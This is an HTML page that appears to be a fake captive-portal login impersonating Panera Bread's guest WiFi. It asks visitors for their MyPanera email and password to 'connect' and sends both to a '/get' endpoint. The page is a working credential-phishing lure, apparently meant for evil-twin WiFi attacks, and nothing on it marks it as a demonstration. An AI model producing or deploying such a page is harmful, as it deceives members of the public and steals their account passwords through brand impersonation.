<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Panera Bread WiFi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Georgia,"Times New Roman",serif;background:#f5f0e8;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:400px;background:#fff;border-radius:4px;overflow:hidden;box-shadow:0 4px 30px rgba(0,0,0,0.1)}
.topbar{height:4px;background:#58A618}
.top{padding:26px 24px 18px;text-align:center;border-bottom:1px solid #f0ebe0}
.brand{font-size:26px;font-weight:700;color:#58A618;font-family:Georgia,serif;font-style:italic;letter-spacing:0.5px}
.tagline{font-size:10px;color:#aaa;letter-spacing:2px;text-transform:uppercase;margin-top:5px;font-family:Arial,sans-serif}
.mid{background:#f8f5f0;border-bottom:1px solid #f0ebe0;padding:8px 24px;display:flex;align-items:center;gap:8px}
.dot{width:6px;height:6px;background:#58A618;border-radius:50%;flex-shrink:0}
.mid span{font-size:11px;color:#aaa;font-family:Arial,sans-serif}
.mid strong{color:#58A618;font-weight:600}
.body{padding:24px;font-family:Arial,sans-serif}
h2{font-size:18px;font-weight:700;color:#3a3a3a;margin-bottom:3px;font-family:Georgia,serif}
.sub{font-size:12.5px;color:#aaa;margin-bottom:4px}
.lbl{display:block;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;color:#888;margin-bottom:6px;margin-top:18px}
input{width:100%;padding:12px 14px;border:1.5px solid #e8e0d0;border-radius:4px;font-size:14.5px;background:#fdfaf6;color:#1a1a1a;font-family:Arial,sans-serif}
input:focus{outline:none;border-color:#58A618}
input::placeholder{color:#ccc}
.btn{width:100%;padding:13px;margin-top:20px;border:none;border-radius:4px;background:#58A618;color:#fff;font-size:13px;font-weight:700;cursor:pointer;font-family:Arial,sans-serif}
.terms{font-size:11px;color:#bbb;text-align:center;margin-top:12px;line-height:1.6}
.terms a{color:#58A618}
.foot{background:#f8f5f0;border-top:1px solid #f0ebe0;padding:11px 24px;display:flex;justify-content:space-between}
.foot span,.foot a{font-size:10.5px;color:#bbb;text-decoration:none;font-family:Arial,sans-serif}
.foot a{color:#58A618}
</style>
</head>
<body>
<div class="card">
  <div class="topbar"></div>
  <div class="top">
    <div class="brand">Panera Bread</div>
    <div class="tagline">You Pick Two &bull; Free WiFi</div>
  </div>
  <div class="mid"><div class="dot"></div><span>Network: <strong>Panera_Guest_WiFi</strong></span></div>
  <div class="body">
    <h2>Welcome to Panera</h2>
    <p class="sub">Sign in with your MyPanera account to connect.</p>
    <form action="/get">
      <label class="lbl">Email Address</label>
      <input name="email" type="text" placeholder="you@example.com" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="Enter your password" required>
      <button type="submit" class="btn">Connect</button>
      <p class="terms">By connecting you agree to our <a href="#">Terms of Use</a>.</p>
    </form>
  </div>
  <div class="foot"><span>&copy; Panera Bread</span><a href="#">Help</a></div>
</div>
</body>
</html>
